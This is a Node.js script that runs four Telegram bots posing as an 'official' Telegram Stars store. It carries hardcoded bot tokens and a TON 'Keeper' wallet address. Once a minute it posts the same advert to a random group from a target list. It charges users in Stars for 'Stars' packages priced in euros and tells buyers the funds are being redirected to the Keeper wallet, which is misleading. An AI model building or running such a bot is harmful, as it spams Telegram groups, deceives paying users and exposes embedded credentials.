const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const { allTargets } = require('./groups');

const TOKENS = [
    process.env.BOT_TOKEN_1 || '9197706596:AAHzaNKwUwhaCGU6B_P-eZ7x2PiVfIoEtCI', 
    process.env.BOT_TOKEN_2 || '9145863220:AAH4KJTGkV7DNCKVTYTRlZiy7bg4ZZ_5KB0', 
    process.env.BOT_TOKEN_3 || '9094556865:AAFXZcwuMjH_pfyQK9_KTDEOuW5h_wUtWW0', 
    process.env.BOT_TOKEN_4 || '9053522895:AAHDuv6qkUGQ7g7gvH88QjMwVR4msnWsnhY'  
];

const KEEPER_WALLET = 'UQBOxLg-Vq86U_y1oJyUFTmvn6tedptaPQ4d3CDUq4O2T_7H';
const app = express();
const PORT = process.env.PORT || 3000;
app.use(express.json());

let systemStats = { totalSentAds: 0, starsPurchasesProcessed: 0, startTime: new Date() };
const mainCoverImage = 'https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800';

const adCaption = `🔥 **OFFICIAL RED SOFTWARE TEAM | Telegram Stars Store** 🔥\n\n` +
    `⭐ Izberi paket ot menjuto dolu za pokupka na Zvezdi.\n` +
    `🔗 **Keeper Akaunt za vryshtane:** \`${KEEPER_WALLET}\``;

const inlineMenu = Markup.inlineKeyboard([
    [Markup.button.callback('⭐ 500 Zvezdi (8.39€)', 'buy_500')],
    [Markup.button.callback('⭐ 1 000 Zvezdi (16.59€)', 'buy_1000')],
    [Markup.button.callback('⭐ 2 500 Zvezdi (40.99€)', 'buy_2500')],
    [Markup.button.callback('⭐ 10 000 Zvezdi (164.99€)', 'buy_10000')],
    [Markup.button.callback('⭐ 50 000 Zvezdi (819.00€)', 'buy_50000')],
    [Markup.button.callback('⭐ 150 000 Zvezdi (2459.00€)', 'buy_150000')],
    [Markup.button.url('👥 Vlez v tvoiata grupa', 'https://t.me/+HTJNMe-pUeEzNmY0')]
]);

TOKENS.forEach((token, index) => {
    try {
        const bot = new Telegraf(token);
        
        bot.start((ctx) => ctx.replyWithPhoto(mainCoverImage, { 
            caption: adCaption, 
            parse_mode: 'Markdown', 
            ...inlineMenu 
        }));
        
        const setupStarPurchase = (actionName, title, amount) => {
            bot.action(actionName, async (ctx) => {
                await ctx.answerCbQuery(`Generirane na ${title}...`);
                await ctx.replyWithInvoice({
                    title: title,
                    description: `Pokupka na zvezdi s avtomatichno prenasochvane kym Keeper akaunt.`,
                    payload: `${actionName}_payload`,
                    provider_token: '',
                    currency: 'XTR',
                    prices: [{ label: title, amount: amount }]
                });
            });
        };

        setupStarPurchase('buy_500', '500 Telegram Stars', 500);
        setupStarPurchase('buy_1000', '1,000 Telegram Stars', 1000);
        setupStarPurchase('buy_2500', '2,500 Telegram Stars', 2500);
        setupStarPurchase('buy_10000', '10,000 Telegram Stars', 10000);
        setupStarPurchase('buy_50000', '50,000 Telegram Stars', 50000);
        setupStarPurchase('buy_150000', '150,000 Telegram Stars', 150000);

        bot.on('pre_checkout_query', (ctx) => ctx.answerPreCheckoutQuery(true));
        
        bot.on('successful_payment', (ctx) => {
            systemStats.starsPurchasesProcessed++;
            ctx.reply(
                `✅ **Uspeshna transakciya!**\n\n` +
                `Sredstvata ot zvezdite sa otrazeni i se prenasochvat kam tvoia Keeper akaunt:\n` +
                `\`${KEEPER_WALLET}\`\n\n` +
                `Blagodarim vi, che izbrahte OFFICIAL RED SOFTWARE TEAM!`, 
                { parse_mode: 'Markdown' }
            );
        });

        bot.launch();
    } catch (e) {}
});

setInterval(async () => {
    if (!allTargets || allTargets.length === 0) return;
    const targetGroup = allTargets[Math.floor(Math.random() * allTargets.length)];
    const activeToken = TOKENS[Math.floor(Math.random() * TOKENS.length)];
    const senderBot = new Telegraf(activeToken);
    try {
        await senderBot.telegram.sendPhoto(targetGroup, mainCoverImage, { 
            caption: adCaption, 
            parse_mode: 'Markdown', 
            ...inlineMenu 
        });
        systemStats.totalSentAds++;
    } catch (err) {}
}, 60 * 1000);

app.get('/', (req, res) => res.json({ status: "STARS STORE 24/7 ACTIVE", keeper: KEEPER_WALLET, stats: systemStats }));
app.listen(PORT, () => console.log(`Running on port ${PORT}`));
